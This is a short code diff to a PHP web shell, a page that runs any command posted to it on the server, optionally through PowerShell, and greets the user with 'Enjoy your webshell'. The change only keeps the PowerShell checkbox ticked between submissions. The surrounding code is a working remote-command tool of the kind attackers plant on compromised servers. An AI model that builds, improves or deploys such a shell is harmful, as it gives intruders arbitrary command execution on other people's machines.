@@ -18,7 +18,8 @@ $user = run_cmd('whoami'); // Get shell user
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 	if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
 		$cmd = $_POST['cmd'];
-		if (isset($_POST['powershell'])) {
+		$powershell_enabled = isset($_POST['powershell']);
+		if ($powershell_enabled) {
 			$cmd_output = run_cmd("powershell -c " . $cmd);
 		} else {
 			$cmd_output = run_cmd($cmd);
@@ -38,7 +39,7 @@ echo "<h2>Enjoy your webshell as user <span style='font-style: italic; font-weig
     <label for="cmd">Enter command:</label><br/>
     <textarea id="cmd" name="cmd" rows="10" cols="70"></textarea><br/>
     <label for="powershell">Use Powershell (windows only)</label>
-    <input type="checkbox" id="powershell" name="powershell" value="1"><br/><br/>
+    <input type="checkbox" id="powershell" name="powershell" value="1" <?php if ($powershell_enabled) echo "checked"; ?>><br/><br/>
     <input type="submit" value="Submit"><span style="font-style: italic;"> (shift+enter)</span>
 </form>
 <br/><hr style="width: 33%; margin-left: 0;">
